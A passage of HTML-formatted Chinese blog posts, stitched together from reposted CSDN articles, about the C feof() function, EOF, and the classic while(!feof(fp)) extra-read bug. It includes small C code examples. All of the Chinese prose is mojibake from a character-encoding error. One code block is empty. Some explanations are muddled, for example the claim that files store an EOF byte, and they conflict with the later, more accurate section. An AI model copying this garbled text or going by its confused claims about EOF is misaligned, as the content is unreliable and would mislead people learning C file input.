è®ºæ˜¯å¦æœ‰å†…å®¹ï¼Œéƒ½ä¼šè¢«åˆ¤æ–­ä¸ºâ€œæ–‡ä»¶ä¸ä¸ºç©ºâ€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE *p;<br>    p = fopen(<span class="hljs-string">&quot;open.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (feof(p))<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ–‡ä»¶ä¸ºç©ºã€‚&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ–‡ä»¶ä¸ä¸ºç©ºã€‚&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>ç›´æ¥ä½¿ç”¨æ—¶çš„é”™è¯¯åˆ†æï¼š<br>å¯¹äºä¸€ä¸ªç©ºæ–‡ä»¶æ¥è¯´ï¼Œå½“ç¨‹åºæ‰“å¼€å®ƒçš„æ—¶å€™ï¼Œå®ƒçš„å…‰æ ‡ä¼šåœåœ¨æ–‡ä»¶çš„å¼€å¤´ï¼Œä½†æ˜¯ç”±äºæ–‡ä»¶é‡Œä»€ä¹ˆå†…å®¹éƒ½æ²¡æœ‰å­˜ï¼ˆä½†æ˜¯EOFæ˜¯å­˜åœ¨çš„ï¼‰ï¼Œå³æ•´ä¸ªæ–‡ä»¶å°±å­˜è´®äº†ä¸€ä¸ªEOFã€‚å½“ç¨‹åºæ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ç›´æ¥è°ƒç”¨feof()æ—¶ï¼Œè¿™ä¸ªå‡½æ•°å°±ä¼šç«™åœ¨å…‰æ ‡çš„ä½ç½®å‘åå¼ æœ›ï¼Œç»“æœå°±çœ‹è§äº†EOFï¼Œç„¶åå°±å½“ç„¶è¿”å›0äº†ã€‚</p><h3 id="å››ã€å¦‚ä½•æ­£ç¡®ä½¿ç”¨"><a href="#å››ã€å¦‚ä½•æ­£ç¡®ä½¿ç”¨" class="headerlink" title="å››ã€å¦‚ä½•æ­£ç¡®ä½¿ç”¨"></a>å››ã€å¦‚ä½•æ­£ç¡®ä½¿ç”¨</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><br></code></pre></td></tr></table></figure><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/konghouy/article/details/80530937">https://blog.csdn.net/konghouy/article/details/80530937</a></p><p>åˆšå¼€å§‹å­¦ä¹ Cè¯­è¨€çš„æ—¶å€™ï¼Œå…³äºæ–‡ä»¶æŒ‡é’ˆè¯»å–å­—ç¬¦çš„ä½¿ç”¨æƒ…å†µæ€»æ˜¯ä¼šé‡åˆ°å„ç§å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜ï¼Œæœ‰æ—¶å€™è«åå¤šå‡ºä¸€ä¸ªç©ºæ ¼æˆ–è€…ä¸€ä¸ªç©ºè¡Œï¼Œåæ¥æ…¢æ…¢æ¥è§¦çš„å¤šäº†ï¼Œæ‰å‘ç°è¿™å…¶ä¸­çš„åŸç†ï¼Œä¼šæ¶‰åŠåˆ°è¾“å…¥å’Œè¾“å‡ºæµçš„ä¸€äº›é—®é¢˜ï¼Œç°åœ¨æ·±åˆ»çš„è§‰å¾—è¦å­¦å¥½å“ªæ€•æ˜¯ä¸€ä»¶å¾ˆå°çš„äº‹æƒ…ï¼Œæˆ‘ä»¬éƒ½è¦æŠ±ç€æ·±å…¥é’»ç ”çš„ç²¾ç¥ã€‚ä¸‹åˆå·®ä¸å¤šèŠ±äº†ä¸¤ä¸ªå¤šå°æ—¶çš„æ—¶é—´æ¥äº†è§£feofçš„ä½¿ç”¨æƒ…å†µï¼Œç°åšå¦‚ä¸‹çš„æ€»ç»“ã€‚</p><p>ä¸€.feofä»‹ç»ï¼š</p><p>1.åœ¨stdio.hä¸­çš„å®å®šä¹‰</p><h1 id="define-IOEOF-0x0010"><a href="#define-IOEOF-0x0010" class="headerlink" title="define  _IOEOF  0x0010"></a>define  _IOEOF  0x0010</h1><h1 id="define-feof-stream-stream-gt-flag-amp-IOEOF"><a href="#define-feof-stream-stream-gt-flag-amp-IOEOF" class="headerlink" title="define  feof(_stream)  ((_stream)-&gt;_flag &amp; _IOEOF)"></a>define  feof(_stream)  ((_stream)-&gt;_flag &amp; _IOEOF)</h1><p>2.feofçš„ä½¿ç”¨ï¼š</p><p>feofç”¨æ£€æµ‹æµä¸Šçš„æ–‡ä»¶ç»“æŸç¬¦ï¼Œå…¶è¿”å›å€¼æœ‰ä¸¤ç§æƒ…å†µï¼šå¦‚æœé‡åˆ°æ–‡ä»¶ç»“æŸï¼Œå‡½æ•°å€¼ä¸ºéé›¶å€¼ï¼Œå¦åˆ™å‡½æ•°å€¼ä¸º0ã€‚</p><p>æ³¨ï¼šæ­¤å¤„çš„æ–‡ä»¶ç»“æŸæ ‡å¿—æ˜¯EOFï¼ŒEOFçš„16è¿›åˆ¶ä»£ç ä¸º0xFFï¼ˆåè¿›åˆ¶ä¸º-1ï¼‰ï¼Œç‰¹ç”¨åœ¨æ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œå› ä¸ºåœ¨æ–‡æœ¬æ–‡ä»¶ä¸­æ•°æ®æ˜¯ä»¥ASCâ…¡ä»£ç å€¼çš„å½¢å¼å­˜æ”¾ï¼Œæ™®é€šå­—ç¬¦çš„ASCâ…¡ä»£ç çš„èŒƒå›´æ˜¯32åˆ°127ï¼ˆåè¿›åˆ¶ï¼‰ï¼Œä¸EOFä¸å†²çªï¼Œå› æ­¤å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚ä½†æ˜¯åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œæ•°æ®æœ‰å¯èƒ½å‡ºç°-1ï¼Œå› æ­¤ä¸èƒ½ç”¨EOFæ¥ä½œä¸ºäºŒè¿›åˆ¶æ–‡ä»¶çš„ç»“æŸæ ‡å¿—ï¼Œå¯ä»¥é€šè¿‡feofå‡½æ•°æ¥åˆ¤æ–­ã€‚</p><p>3.feofçš„å·¥ä½œåŸç†ï¼š</p><pre><code>å…³äºè¿™ä¸ªåŸç†ä»‹ç»ï¼Œç½‘ä¸Šçœ‹åˆ°äº†å¥½å¤šèµ„æ–™ï¼Œå…¶ä¸­ä¸€ä¸ªçš„è§£é‡Šæœ€ä¸ºå½¢è±¡ï¼Œæ˜“äºç†è§£ï¼Œç‰¹åœ¨æ­¤åœ°å¼•ç”¨ï¼Œåæ–‡ä¼šæ¨èé‚£ä½åšä¸»çš„åšå®¢é“¾æ¥ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹æ­£ç‰ˆçš„ä¸œè¥¿ã€‚</code></pre><p>åœ¨Cè¯­è¨€ä¸­æœ‰feof()å‡½æ•°ï¼Œåœ¨æ•°æ®åº“ä¸­æœ‰eof()å‡½æ•°ï¼ŒäºŒè€…ä½œç”¨ä¸€æ ·ï¼Œä½†æ˜¯è¿ä½œæ–¹å¼ç¡®å®å®Œå…¨ä¸åŒçš„ã€‚åœ¨æ•°æ®åº“ä¸­ï¼Œeof()å‡½æ•°çš„ä½¿ç”¨ç¬¦åˆæˆ‘ä»¬çš„ç›´è§‚æ„Ÿå—ï¼Œå®ƒæ˜¯è¯»å–æŒ‡é’ˆå½“å‰çš„ä½ç½®ï¼Œå¦‚æœæŒ‡é’ˆå¤„äºæœ€åä¸€ä¸ªå­—ç¬¦çš„ä½ç½®ï¼Œå°±çŸ¥é“æ–‡ä»¶ç»“æŸäº†ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œå°±åƒä½ èµ°åˆ°äº†ç«è½¦çš„æœ€åä¸€èŠ‚ä½ç½®ï¼Œå¯çŸ¥ç«è½¦åˆ°å¤´äº†ã€‚ä½†æ˜¯åœ¨Cè¯­è¨€ä¸­ï¼Œfeof()å‡½æ•°çš„ä½¿ç”¨æ˜¯æ ¹æ®æŒ‡é’ˆå†…å®¹åˆ¤æ–­çš„ï¼Œè€ŒéæŒ‡é’ˆä½ç½®ï¼Œæ— è®ºæŒ‡é’ˆæ˜¯å¦åˆ°å¤´ï¼Œç”šè‡³è¶…å‡ºäº†ï¼Œå®ƒéƒ½éœ€è¦å…ˆè¯»å–æŒ‡é’ˆçš„å†…å®¹ï¼Œçœ‹ä¸€çœ‹å†…å®¹æ˜¯å¦æ˜¯EOFï¼Œç„¶åæ‰çŸ¥é“æ–‡ä»¶åˆ°å¤´äº†ï¼ŒåŒæ ·åœ¨ä¹‹å‰çš„ä¾‹å­ä¸­ï¼Œä½ èµ°åˆ°äº†æœ€åä¸€èŠ‚çš„ï¼Œä½†æ˜¯ç”±äºæœ€åä¸€èŠ‚ä»æœ‰ä¹˜å®¢ï¼Œæ‰€ä»¥ä½ ä¼šåˆ¤æ–­ç«è½¦æ²¡æœ‰åˆ°å¤´ï¼Œä½ ç»§ç»­å‘å‰èµ°ï¼Œç›´åˆ°ä¸‹äº†ç«è½¦ï¼Œç«™åœ¨è½¨é“ä¸Šï¼Œæ²¡æœ‰ä¸€ä¸ªä¹˜å®¢ï¼Œæ‰€ä»¥ä½ çŸ¥é“ç«è½¦åˆ°å¤´äº†ã€‚å› æ­¤ï¼Œå°±ä¼šå‡ºç°ä¸€äº›å¥‡æ€ªçš„ç°è±¡ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ–‡æ¡£ä¸­æ€»ä¼šæ¯”æºæ–‡æ¡£å¤šå‡ºä¸€äº›ï¼Œæœ‰æ—¶å€™å¯èƒ½æ˜¯æœ€åå­—ç¬¦é‡å¤ä¸€éçš„é—®é¢˜ã€‚</p><p>äºŒ.feofå®ä¾‹åˆ†æï¼š</p><p> æ¥ä¸‹æ¥ï¼Œæ ¹æ®å‡ ä¸ªå°çš„å®ä¾‹ä»£ç æ¥ç›´è§‚çš„åˆ†æfeofçš„å·¥ä½œåŸç†ã€‚åœ¨æ­¤ï¼Œæˆ‘ä»¥æ–‡ä»¶è¯»å–ä¸ºä¾‹ï¼Œä»testä¸­è¯»å–æ•°æ®ï¼Œç„¶åæ ¹æ®ä¸åŒå¤§è¯»å–æ–¹å¼æ¥åˆ†æç»“æœã€‚</p><p>test.txt:</p><p>1 2 3              æ³¨æ„ï¼šæ–‡æ¡£ä¸­1,2,3ä¹‹é—´æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œåœ¨3ä¹‹åæ²¡æœ‰ç©ºè¡Œã€‚</p><p>å¸¸è§é”™è¯¯ä»£ç ï¼š</p><p>Code1.</p><p>  char ch;</p><p>  while(!feof(fp))</p><p> {</p><pre><code>    ch=fgetc(fp);    printf(&quot;%c&quot;,ch);</code></pre><p>  }</p><p>å®éªŒç»“æœ:</p><p>åˆ†æï¼š</p><p>åˆšæ‰ç‰¹åœ°æåˆ°ï¼Œåœ¨æ–‡æœ¬ä¸­3ä¹‹åå·²ç»ç»“æŸï¼Œä½†æ˜¯è¿™é‡Œçš„è¾“å‡ºç»“æœä¸­è«åå¤šäº†ä¸€ä¸ªä¸å¯è§çš„å­—ç¬¦ï¼Œç„¶åæˆ‘ä»¬æ¥æ¢ç©¶ä¸€ä¸‹è¿™ä¸ªå­—ç¬¦æ˜¯ä»€ä¹ˆã€‚</p><p>   ä¿®æ”¹ä»£ç :  printf(â€œ%câ€,ch); â€”â€”-&gt; printf(â€œ%d*â€,ch); è¾“å‡ºæ¯ä¸ªå­—ç¬¦çš„å€¼ï¼Œå¾—åˆ°ï¼š</p><p>   é€šè¿‡å¯¹æ¯”ï¼Œæˆ‘ä»¬çœ‹åˆ°æœ€åçš„å­—ç¬¦å€¼æ˜¯-1ï¼Œä¹Ÿå°±æ˜¯åˆšæ‰æåˆ°çš„EOFã€‚ä¹Ÿè®¸æ­¤åˆ»ä½ ä¼šæƒ³ï¼Œæ—¢ç„¶æ˜¯EOFï¼Œä¸ºä»€ä¹ˆæŠŠæ–‡ä»¶ç»“æŸæ ‡å¿—è¾“å‡ºæ¥äº†ï¼Œä¸æ˜¯å·²ç»å¢åŠ äº†åˆ¤æ–­!feof(fp)ï¼Ÿç°åœ¨ä½ å¯ä»¥å›æƒ³ä¸€ä¸‹ä¹‹å‰åœ¨æ–‡ç« å¼€å§‹çš„ä»‹ç»ï¼Œæˆ‘ä»¬è¯´è¿‡feofå¹¶ä¸æ˜¯çœŸæ­£çš„ç»“æŸï¼Œå®ƒéœ€è¦é‡åˆ°EOFæ—¶æ‰ä¼šå˜æˆæ­£å€¼ï¼Œæ­¤åˆ»æ‰æ˜¯ç»“æŸï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œfeoféœ€è¦åœ¨è¯»å‡ºEOFä¹‹åï¼Œæ‰çŸ¥é“æ–‡ä»¶ç»“æŸäº†ï¼Œç°åœ¨æˆ‘ä»¬æŠŠfeofçš„è¿”å›å€¼è¾“å‡ºæ¥çœ‹ä¸€ä¸‹å®ƒæ˜¯åœ¨ä»€ä¹ˆæ—¶å€™å˜å€¼çš„ã€‚</p><p>   é€šè¿‡å¯¹æ¯”ï¼Œæˆ‘ä»¬çœ‹åˆ°ï¼Œåœ¨è¯»å–æœ€åä¸€ä¸ªå­—ç¬¦3åï¼Œfeof()çš„è¿”å›å€¼æ˜¯0ï¼Œæ­¤æ—¶while()æ¡ä»¶æˆç«‹ï¼Œç„¶åç»§ç»­å‘æ–‡ä»¶åè¯»ï¼Œè¯»å‡ºæ–‡ä»¶ç»“æŸæ ‡å¿—EOFï¼Œæ­¤åˆ»feof()çš„è¿”å›å€¼å˜ä½16,while()æ¡ä»¶ä¸æ»¡è¶³ï¼Œå› æ­¤ä¸å†ç»§ç»­ï¼Œä½†æ˜¯ç”±äºè¯»å‡ºäº†æœ€åä¸€ä¸ªEOFï¼ŒæŒ‰ç…§ä»£ç çš„è¦æ±‚ï¼Œè¯»ä¸€ä¸ªé©¬ä¸Šè¾“å‡ºæ¥ï¼Œå› æ­¤è¦è¾“å‡ºæ¥ï¼Œå°±å‡ºç°äº†ä¸Šæ–‡çš„å¤šå‡ºæ¥ä¸€ä¸ªå­—ç¬¦æƒ…å†µã€‚</p><p>Code2.</p><p>å¦‚æœå°†ä¸Šè¿°ä»£ç ä¸­ ch=fgetc(fp);â€”-&gt;fscanf(fp,â€%câ€,&amp;c);,å³ä½¿ç”¨fscanfå‡½æ•°ï¼Œå‡ºç°å¦‚ä¸‹ç»“æœ:</p><p>åŒæ ·çš„ï¼Œæ­¤æ—¶æŠŠæœ€åä¸€ä¸ªå­—ç¬¦é‡å¤è¾“å‡ºäº†ï¼Œæˆ‘ä»¬ç»§ç»­æŸ¥çœ‹ä¸€ä¸‹feofçš„å€¼å˜åŒ–æƒ…å†µ.</p><p>   å’Œä¸Šé¢çš„åˆ†ææƒ…å†µç›¸ä¼¼ï¼Œè‡³äºä¸ºä»€ä¹ˆæœ€åä¸€ä¸ªå­—ç¬¦è¾“å‡ºçš„æ˜¯3ï¼Œè€Œä¸æ˜¯ä¸Šé¢çš„EOF ,è¿™å°±æ˜¯fscanfçš„ä½¿ç”¨é—®é¢˜äº†ï¼Œå…³äºfscanfåœ¨é‡åˆ°EOFæ—¶ï¼Œåº”ç»ä¸èƒ½è¯»å…¥æœ‰æ•ˆå­—ç¬¦äº†ï¼Œä½†æ˜¯æ­¤æ—¶è¾“å‡ºæµä¸­çš„å­—ç¬¦è¿˜æ˜¯3ï¼Œå› æ­¤printfä¸­åˆè¾“å‡ºä¸€é3ã€‚</p><p>è§£å†³åŠæ³•ï¼š</p><p>ä¸Šè¿°çš„é—®é¢˜å°±æ˜¯æˆ‘ä»¬å¸¸è§çš„å¤šè¾“å‡ºé—®é¢˜ï¼Œé‚£ä¹ˆè¯¥æ€ä¹ˆæ ·è§£å†³è¿™äº›é—®é¢˜å‘¢ï¼Œæˆ‘åœ¨æ­¤æå‡ºä¸¤ç§è§£å†³åŠæ³•ã€‚</p><p>Code3:</p><p>char c;</p><p> c=fgetc(fp);</p><p> while(!feof(fp))</p><p>  {</p><pre><code>    printf(&quot;%c&quot;,c);    c=fgetc(fp);</code></pre><p>   }</p><p>è¿™ç§è§£å†³åŠæ³•åªæ˜¯å†™æ³•ä¸Šçš„å·§å¦™å˜åŒ–ï¼Œåœ¨1å’Œ2ä¸­ï¼Œæˆ‘ä»¬å€¾å‘äºç°åœ¨è¯»å…¥ï¼Œç°åœ¨è¾“å‡ºï¼Œåœ¨3ä¸­æˆ‘ä»¬æå‡ºä¸€ç§æ–°çš„æ€æƒ³ï¼Œå…ˆè¯»å…¥ï¼Œç„¶ååˆ¤æ–­æ­¤æ—¶çš„æŒ‡é’ˆä½ç½®æ˜¯å¦åˆæ³•ï¼Œåœ¨åˆæ³•çš„æƒ…å†µä¸‹è¾“å‡ºä¸Šä¸€æ¬¡è¯»å…¥çš„å€¼ï¼Œç„¶ååœ¨è¯»å–ä¸‹ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯å…ˆè¯»ç„¶ååˆ¤æ–­æœ€åè¾“å‡ºçš„æ¨¡å¼ï¼Œæˆ‘ä»¬æ¯æ¬¡è¾“å‡ºçš„æ˜¯ä¸Šæ¬¡çš„å­—ç¬¦ï¼Œå› æ­¤åœ¨æœ€åä¸€ä¸ªä¸åˆæ³•çš„ä½ç½®ï¼Œæˆ‘ä»¬è¾“å‡ºäº†æœ€åä¸€ä¸ªå­—ç¬¦ï¼Œä¹‹åå°±ä¸ä¼šç»§ç»­å¾ªç¯äº†ã€‚å®éªŒç»“æœå¦‚ä¸‹ï¼š</p><p>Code4:</p><p>å¦‚æœä½ è¯»å–å‡½æ•°æ˜¯è¦æŒ‰ç…§æ•´å‹è¯»å–æ—¶ï¼Œå¹¶ä¸”æ–‡ä»¶çš„ç»“å°¾å­˜åœ¨æ¢è¡Œæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é‡‡ç”¨fscanfçš„æ–¹å¼æ¥åˆ¤æ–­æ˜¯å¦è¯»åˆ°æ–‡ä»¶ç»“å°¾ã€‚å¦‚ä¸‹ä»£ç ï¼š</p><pre><code>  int c;  while((fscanf(fp,&quot;%d&quot;,&amp;c))==1)    // while((fscanf(fp,&quot;%d&quot;,&amp;c))!=EOF)  &#123;     printf(&quot;%d-&quot;,c);  &#125;</code></pre><p>è¿™ç§è§£å†³åŠæ³•é‡‡ç”¨çš„æ˜¯åˆ©ç”¨fscanfçš„è¿”å›å€¼æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ç»“æŸï¼Œå…³äºfscanfçš„è¿”å›å€¼æ˜¯ï¼šfscanfè¿”å›çš„æ˜¯å®é™…è¯»å–çš„æ•°æ®ä¸ªæ•°ï¼Œå‡ºé”™æˆ–è€…åˆ°ç»“å°¾è¿”å›EOFã€‚åœ¨è¯»å–æœ€åä¸€ä¸ªå­—ç¬¦æ—¶ï¼Œfscanfä¸èƒ½è¯»åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œå› æ­¤ç»“æœå°†ä¼šè¿”å›EOFï¼Œè‡ªç„¶ä¸ä¼šè¿›å…¥whieå¾ªç¯ä¸­ï¼Œæ•´ä½“æ€è·¯æ˜¯å…ˆåˆ¤æ–­è¯»åˆ°çš„å­—ç¬¦æ˜¯å¦åˆæ³•ï¼Œç„¶åæ‰è¾“å‡ºã€‚å®éªŒç»“æœå¦‚ä¸‹ï¼š</p><p>5.è¡¥å……ï¼šæˆ‘åœ¨4ä¸­ç‰¹æ„æåˆ°äº†æ–‡ä»¶ç»“å°¾å­˜åœ¨æ¢è¡Œï¼Œç°æå‡ºä¸€ç§å¾ˆå¥‡æ€ªçš„ç°è±¡ã€‚</p><p>5.1åœ¨å¤„ç†æ•´å‹æ•°æ®æ—¶ï¼Œæ–‡ä»¶ç»“å°¾æ²¡æœ‰æ¢è¡Œï¼Œå³ä½¿æŒ‰ç…§1å’Œ2çš„é”™è¯¯æ–¹å¼å†™ï¼Œä¹Ÿä¸å­˜åœ¨ä¸Šè¿°çš„å¤šè¯»é—®é¢˜ï¼Œå¦‚ä¸‹ï¼š</p><p>int c;</p><pre><code>while(!feof(fp))&#123;    fscanf(fp,&quot;%d&quot;,&amp;c);    printf(&quot;%d-&quot;,c);&#125;</code></pre><p>å®éªŒç»“æœå¦‚ä¸‹ï¼š</p><p>5.2å¦‚æœæˆ‘å°†test.txtä¸­çš„é—®ä»·ç¨ä½œæ”¹å˜ï¼Œåœ¨1 2 3ååŠ ä¸Šæ¢è¡Œï¼Œå°±ä¼šå‡ºç°å¤šè¯»é—®é¢˜ï¼Œæµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š</p><p>é’ˆå¯¹5ä¸­çš„ç°è±¡ï¼Œç°åœ¨æˆ‘è¿˜æ²¡æœ‰ç†è§£å…·ä½“æ˜¯ä»€ä¹ˆåŸå› é€ æˆçš„ï¼Œä»¥åç­‰åˆ°å­¦ä¼šæ—¶åœ¨ç»§ç»­å†™å§ã€‚<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œlhyerã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/lhyer/article/details/45012233">https://blog.csdn.net/lhyer/article/details/45012233</a></p><p>åœ¨cè¯­è¨€ä¸­ç»å¸¸ç”¨EOFå’Œfeof()æ¥åˆ¤æ–­æ–‡ä»¶çš„ç»“æŸï¼Œç°å°†æœ‰å…³ç”¨æ³•æ€»ç»“å¦‚ä¸‹ï¼š</p><p>å®šä¹‰<br>EOFæ˜¯End Of File çš„ç¼©å†™ï¼Œæ˜¯cè¯­è¨€ä¸­æ ‡å‡†åº“ä¸­å®šä¹‰çš„å®ï¼Œå®šä¹‰ä¸ºï¼š#define  EOF  (-1)ï¼›<br>feof() ç”¨äºæµ‹è¯•æµæ–‡ä»¶çš„ç»“æŸï¼Œæœ‰å®å’Œå‡½æ•°ä¸¤ç§å®šä¹‰ï¼š<br>å®å®šä¹‰ï¼š #define feof(_stream)  ((_stream)-&gt;_flag &amp; _IOEOF)ï¼Œå…¶ä¸­_IOEOFçš„ä¸ºï¼š#define _IOEOF 0x0010<br>å‡½æ•°å®šä¹‰ï¼šint feof( FILE *stream );<br>è¯´æ˜<br>      EOFçš„å€¼ä¸º-1ï¼Œæ˜¯intç±»å‹æ•°æ®ï¼Œåœ¨32ä½ç³»ç»Ÿä¸­ï¼Œå¯ä»¥è¡¨ç¤ºä¸º0xFFFFFFFF; EOF ä¸æ˜¯ä¸€ä¸ªå­—ç¬¦ï¼Œä¹Ÿä¸æ˜¯æ–‡ä»¶ä¸­å®é™…å­˜åœ¨çš„å†…å®¹ã€‚EOFä¸ä½†èƒ½è¡¨ç¤ºè¯»æ–‡ä»¶åˆ°äº†ç»“å°¾è¿™ä¸€çŠ¶æ€ï¼Œå®ƒè¿˜èƒ½è¡¨ç¤º I/O æ“ä½œä¸­çš„è¯»ã€å†™é”™è¯¯ï¼ˆå¯ä»¥ç”¨ ferror() æ¥æ£€æµ‹ï¼‰ä»¥åŠå…¶å®ƒä¸€äº›å…³è”æ“ä½œçš„é”™è¯¯çŠ¶æ€ï¼›<br>      feof()åªç”¨äºæµ‹è¯•æµæ–‡ä»¶çš„ç»“æŸï¼Œå½“åˆ°è¾¾ç»“å°¾æ—¶ï¼Œè¿”å›é0ï¼›å½“æ–‡ä»¶å†…éƒ¨ä½ç½®æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶ç»“æŸæ—¶ï¼Œå¹¶æœªç«‹å³ç½®ä½FILEç»“æ„ä¸­çš„æ–‡ä»¶ç»“æŸæ ‡è®°ï¼Œåªæœ‰å†æ‰§è¡Œä¸€æ¬¡è¯»æ–‡ä»¶æ“ä½œï¼Œæ‰ä¼šç½®ä½ç»“æŸæ ‡å¿—ï¼Œæ­¤åè°ƒç”¨feofæ‰ä¼šè¿”å›ä¸ºçœŸã€‚<br>      å‡½æ•°å¦‚fgetcæˆ–getcè¿”å›EOFå¹¶ä¸ä¸€å®šè¡¨ç¤ºæ–‡ä»¶ç»“æŸï¼Œå½“è¯»å–æ–‡ä»¶å‡ºé”™æ—¶ä¹Ÿä¼šè¿”å›EOFï¼Œä»…å‡­è¿”å›-1å°±è®¤ä¸ºæ–‡ä»¶ç»“æŸæ˜¯é”™è¯¯çš„ï¼›æ­£å› ä¸ºå¦‚æ­¤ï¼Œæˆ‘ä»¬éœ€è¦feof()æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ç»“æŸï¼Œå½“ç„¶ç”¨feof()æ¥åˆ¤æ–­æ–‡ä»¶ç»“æŸæ—¶ä¹Ÿéœ€è¦åˆ¤æ–­è¯»å–æ“ä½œæ˜¯å¦å‡ºé”™ï¼Œè¿™æ—¶å¯ä»¥ç”¨ferror()æ¥åˆ¤æ–­ï¼Œå½“å…¶ä¸ºçœŸæ—¶è¡¨ç¤ºæœ‰é”™è¯¯å‘ç”Ÿã€‚åœ¨å®é™…çš„ç¨‹åºä¸­ï¼Œåº”è¯¥æ¯æ‰§è¡Œä¸€æ¬¡æ–‡ä»¶æ“ä½œï¼Œå°±ç”¨ç”¨ferrorå‡½æ•°æ£€æµ‹æ˜¯å¦å‡ºé”™ã€‚<br>ä¸¾ä¾‹<br>å‡è®¾æ–‡ä»¶æŒ‡é’ˆfpæŒ‡å‘æŸä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­æœ‰å­—ç¬¦ä¸²â€œhelloâ€ï¼Œä¸‹é¢çš„ä»£ç å°†è¾“å‡ºhelloå¤–ï¼Œè¿˜å°†è¾“å‡ºä¸€ä¸ªç»“æŸå­—ç¬¦EOF(EOFæ˜¯fgetcå‡½æ•°çš„è¿”å›å€¼ï¼Œå¹¶ä¸æ˜¯æ–‡ä»¶ä¸­å­˜åœ¨EOF)ï¼š</p><pre><code>int c=0;while(!feof(fp))&#123;    int c=fgetc(fp);    printf(&quot;%c:/t%x/n&quot;,c,c);&#125;</code></pre><p>å…¶åŸå› å°±æ˜¯å½“å†…éƒ¨æŒ‡é’ˆæŒ‡å‘ç»“å°¾æ—¶ï¼Œè¿˜è¦æ‰§è¡Œä¸€æ¬¡è¯»æ“ä½œï¼Œæ–‡ä»¶ç»“æŸæ ‡è®°æ‰ç½®ä½ï¼Œè€Œä¸‹é¢çš„ä»£ç å°†åªè¾“å‡ºâ€œhelloâ€ä¸è¾“å‡ºæ–‡ä»¶ç»“æŸç¬¦ï¼š</p><p>int cï¼›<br>         c=fgetc(fp);<br>    while(!feof(fp))<br>    {<br>        printf(â€œ%c:/t%x/nâ€,c,c);<br>        c=fgetc(fp);<br>    }</p><p>å½“æ–‡ä»¶å†…éƒ¨æŒ‡é’ˆæŒ‡å‘ç»“æŸä½ç½®æ—¶ï¼Œå…ˆæ‰§è¡Œä¸€æ¬¡è¯»æ“ä½œï¼Œç½®ä½æ–‡ä»¶ç»“æŸæ ‡è®°ï¼Œwhileå¾ªç¯ç«‹å³ç»“æŸã€‚<br>éœ€è¦æ³¨æ„çš„å‡ ç‚¹</p><p>(1) å­—èŠ‚çš„è¯»å–å’Œå†™å…¥</p><pre><code>  fgetcæˆ–getcè¿”å›ä¸€ä¸ªintç±»å‹æ•°æ®ï¼Œåœ¨æ­£å¸¸çš„æƒ…å†µä¸‹, fgetcæˆ–getcä»¥ unsigned char çš„æ–¹å¼è¯»å–æ–‡ä»¶æµ, æ‰©å¼ ä¸ºä¸€ä¸ªæ•´æ•°,å¹¶è¿”å›. æ¢è¨€ä¹‹, fgetc ä»æ–‡ä»¶æµä¸­å–ä¸€ä¸ªå­—èŠ‚, å¹¶åŠ ä¸Š24ä¸ªé›¶ï¼Œæˆä¸ºä¸€ä¸ªå°äº256çš„æ•´æ•°ï¼Œç„¶åè¿”å›ã€‚</code></pre><p> int c;<br>     while ((c = fgetc (rfp))!= -1) // -1å°±æ˜¯ EOF<br>         fputc (c, wfp);</p><pre><code>  åœ¨æ­£å¸¸è¯»å–çš„æƒ…å†µä¸‹, ä¸Šè¿°fgetcå‡½æ•°è¿”å›çš„æ•´æ•°å‡å°äº256, å³0x0~0xFF. è€Œè¯»ä¸å‡º 0xFFFFFFFFï¼›è€Œå†™å…¥æ—¶fputc ä¸­çš„ c è™½ç„¶æ˜¯æ•´æ•°, ä½†åœ¨ fputc å°†å…¶å†™å…¥æ–‡ä»¶æµä¹‹å‰, åˆæŠŠæ•´æ•°çš„é«˜24ä½å»æ‰äº†, æ‰€ä»¥å¦‚æœç”¨fputcæŠŠ 0xFFFFFFFF å¾€æ–‡ä»¶é‡Œå¤´å†™, é«˜24ä½è¢«å±è”½,å†™å…¥çš„å°†æ˜¯ 